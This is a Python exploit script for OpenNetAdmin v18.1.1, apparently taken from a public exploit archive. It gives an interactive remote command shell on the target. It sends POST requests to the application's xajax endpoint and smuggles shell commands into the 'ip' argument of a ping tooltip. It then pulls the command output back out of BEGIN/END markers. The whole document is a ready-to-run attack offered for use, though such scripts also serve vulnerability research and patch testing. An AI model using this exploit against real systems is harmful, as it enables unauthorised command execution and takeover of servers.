# Exploit Title: OpenNetAdmin v18.1.1 - Remote Command Execution
# Date: 2021-07-29
# Exploit Author: Cristian Rebollo @rekkatz
# Software Link: https://github.com/opennetadmin/ona
# Vendor Homepage: https://opennetadmin.com/
# Version: v18.1.1
# Tested on: Linux

import re
import sys
import time
import requests

from signal import *

def handler(sig, frame):
    print("\n\n[-] Exiting...")
    sys.exit(1)

# Ctrl+C
signal(SIGINT, handler)

def makeRequest(url):

    while True:
        command = input("\n[Command]>$: ")

        data_post = {
            'xajax': 'window_submit',
            'xajaxr': '1574117726710',
            'xajaxargs[]': ['tooltips', f'ip=>;echo "BEGIN $({command}) END"', 'ping']
        }

        try:
            r = requests.post(main_url, data = data_post)
            rce_output = re.findall(r'BEGIN\s(.*?)\sEND', r.text, re.DOTALL)
            print("\n" + rce_output[0])
            r.close()

        except Exception as e:
            print("\n[!] Check URL Login and try again")
            sys.exit(1)

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print("Written in Python3")
        print(f"\n[?] - USAGE: {sys.argv[0]} + Login URL")
        sys.exit(1)

    else:
        main_url = sys.argv[1]
        makeRequest(main_url)
